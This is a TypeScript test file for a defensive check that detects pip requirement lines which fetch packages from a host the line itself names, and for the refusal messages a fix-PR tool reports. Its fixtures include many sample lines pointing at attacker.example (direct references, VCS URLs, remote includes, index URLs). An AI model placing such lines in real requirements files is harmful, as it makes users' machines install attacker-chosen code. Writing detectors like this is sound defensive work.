/**
 * `fixpr/repoPackageConfig.ts#requirementsChooseSource` — a pip requirement
 * that fetches from a host its own line names (a direct reference, a bare
 * URL, a VCS URL, an include from a URL) is the repository's choice of where
 * the user's machine downloads and builds code from, exactly like
 * `--index-url`, and create_fix_pr refuses it the same way, naming it (review
 * of 3.0, W2E). So is a requirements file it could not read to check.
 */
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import {
  installRefusal,
  pipSourceRefusal,
  requirementsChooseIndex,
  requirementsChooseSource,
} from '../../../src/fixpr/repoPackageConfig.js';
import { cleanupTempDirs, makeTempDir } from '../../helpers/tempDir.js';

afterAll(cleanupTempDirs);

function tree(files: Record<string, string>): string {
  const root = makeTempDir('pip-src-');
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(join(root, rel, '..'), { recursive: true });
    writeFileSync(join(root, rel), body);
  }
  return root;
}

const choose = (line: string): ReturnType<typeof requirementsChooseSource> =>
  requirementsChooseSource(tree({ 'requirements.txt': `requests==2.31.0\n${line}\n` }));

describe('requirementsChooseSource — a line that fetches from a host it names', () => {
  it.each([
    ['pkg @ https://attacker.example/pkg-1.0.tar.gz', 'a direct reference (https://attacker.example)'],
    ['pkg[extra] @ https://attacker.example/pkg.whl ; python_version >= "3.8"', 'a direct reference (https://attacker.example)'],
    ['pkg@http://192.0.2.7:8080/pkg.whl', 'a direct reference (http://192.0.2.7)'],
    ['https://attacker.example/pkg-1.0.tar.gz', 'a URL (https://attacker.example)'],
    ['-e https://attacker.example/pkg.zip', 'a URL (https://attacker.example)'],
    ['git+https://attacker.example/repo.git#egg=pkg', 'a VCS URL (git+https://attacker.example)'],
    ['-e git+https://user:token@attacker.example/repo.git#egg=pkg', 'a VCS URL (git+https://attacker.example)'],
    ['--editable=git+https://attacker.example/repo.git#egg=pkg', 'a VCS URL (git+https://attacker.example)'],
    ['pkg @ git+ssh://git@attacker.example/repo.git@v1', 'a VCS URL (git+ssh://attacker.example)'],
    ['hg+https://attacker.example/repo#egg=pkg', 'a VCS URL (hg+https://attacker.example)'],
    ['svn+svn://attacker.example/repo#egg=pkg', 'a VCS URL (svn+svn://attacker.example)'],
    ['bzr+https://attacker.example/repo#egg=pkg', 'a VCS URL (bzr+https://attacker.example)'],
    ['-r https://attacker.example/requirements.txt', 'an include from a URL (https://attacker.example)'],
    ['--constraint=https://attacker.example/c.txt', 'an include from a URL (https://attacker.example)'],
    ['-chttps://attacker.example/c.txt', 'an include from a URL (https://attacker.example)'],
  ])('refuses %s, naming it', (line, what) => {
    expect(choose(line)).toEqual({ where: `requirements.txt: ${what}`, kind: 'remote' });
  });

  it.each([
    'pkg @ file:///opt/wheels/pkg-1.0-py3-none-any.whl',
    '-e file:.',
    './vendor/pkg',
    '-e ./vendor/pkg',
    'requests>=2.0 ; python_version >= "3.8"',
    'pkg==1.0 --hash=sha256:0123456789abcdef',
    '# see https://attacker.example and git+https://attacker.example',
    'pkg==1.0  # maintainer: someone@example.com',
  ])('lets %s through', (line) => {
    expect(choose(line)).toBeNull();
  });

  it('finds one in an included file, and names that file', () => {
    const dir = tree({ 'requirements.txt': '-r base.txt\n', 'base.txt': 'pkg @ https://attacker.example/p.whl\n' });
    expect(requirementsChooseSource(dir)).toEqual({ where: 'base.txt: a direct reference (https://attacker.example)', kind: 'remote' });
  });

  it('an index option keeps its own kind and wording', () => {
    expect(choose('--index-url https://attacker.example/simple')).toEqual({ where: 'requirements.txt: --index-url', kind: 'index' });
    expect(requirementsChooseIndex(tree({ 'requirements.txt': 'git+https://attacker.example/r.git#egg=x\n' }))).toBeNull();
  });
});

describe('requirementsChooseSource — a file it cannot read to check', () => {
  it('an oversized requirements file is unchecked, named', () => {
    const dir = tree({ 'requirements.txt': `# pad\n${'#'.repeat(4 * 1024 * 1024)}\n` });
    expect(requirementsChooseSource(dir)).toEqual({
      where: 'requirements.txt: it is larger than the size cap and was not read',
      kind: 'unchecked',
    });
  });

  it('an include that leaves the checkout is unchecked, named', () => {
    const outside = makeTempDir('pip-src-outside-');
    writeFileSync(join(outside, 'x.txt'), 'requests==2.31.0\n');
    const dir = tree({ 'requirements.txt': `-r ${join(outside, 'x.txt')}\n` });
    const choice = requirementsChooseSource(dir);
    expect(choice?.kind).toBe('unchecked');
    expect(choice?.where).toMatch(/: it resolves outside the project/);
  });

  it("reads a monorepo's `-r ../shared/…` inside the checkout", () => {
    const root = tree({
      'svc/requirements.txt': '-r ../shared/base.txt\n',
      'shared/base.txt': '--extra-index-url https://attacker.example/simple\n',
    });
    expect(requirementsChooseSource(join(root, 'svc'), [], root)).toEqual({
      where: '../shared/base.txt: --extra-index-url',
      kind: 'index',
    });
    // Without the checkout, the include cannot be read: unchecked, never "chooses nothing".
    expect(requirementsChooseSource(join(root, 'svc'))?.kind).toBe('unchecked');
  });
});

describe('the refusal create_fix_pr reports', () => {
  it('names the file and the source, for each kind', () => {
    expect(pipSourceRefusal({ where: 'requirements.txt: --index-url', kind: 'index' })).toBe(
      "the project's requirements choose a package index (requirements.txt: --index-url); dev-guardian doesn't install from a repository-chosen index",
    );
    expect(pipSourceRefusal({ where: 'requirements.txt: a VCS URL (git+https://attacker.example)', kind: 'remote' })).toBe(
      "the project's requirements fetch from a host they name (requirements.txt: a VCS URL (git+https://attacker.example)); " +
        "dev-guardian doesn't install from a repository-chosen source",
    );
    expect(pipSourceRefusal({ where: 'requirements.txt: it is larger than the size cap and was not read', kind: 'unchecked' })).toMatch(
      /could not all be read to check where they install from \(requirements\.txt: .*\); dev-guardian doesn't install from requirements it cannot check$/,
    );
  });

  it('installRefusal refuses a pip step and a deps_audit re-scan over a direct reference', () => {
    const dir = tree({ 'requirements.txt': 'django==3.2.0\npkg @ https://attacker.example/pkg.whl\n' });
    const pip = installRefusal({ projectDir: dir, stepEcosystems: ['pip'], stepFiles: ['requirements.txt'], rescanTools: [] });
    expect(pip).toMatch(/fetch from a host they name \(requirements\.txt: a direct reference \(https:\/\/attacker\.example\)\)/);
    expect(installRefusal({ projectDir: dir, stepEcosystems: ['npm'], stepFiles: [], rescanTools: ['deps_audit'] })).toBe(pip);
    expect(installRefusal({ projectDir: dir, stepEcosystems: ['npm'], stepFiles: [], rescanTools: ['scan_deps'] })).toBeNull();
  });
});
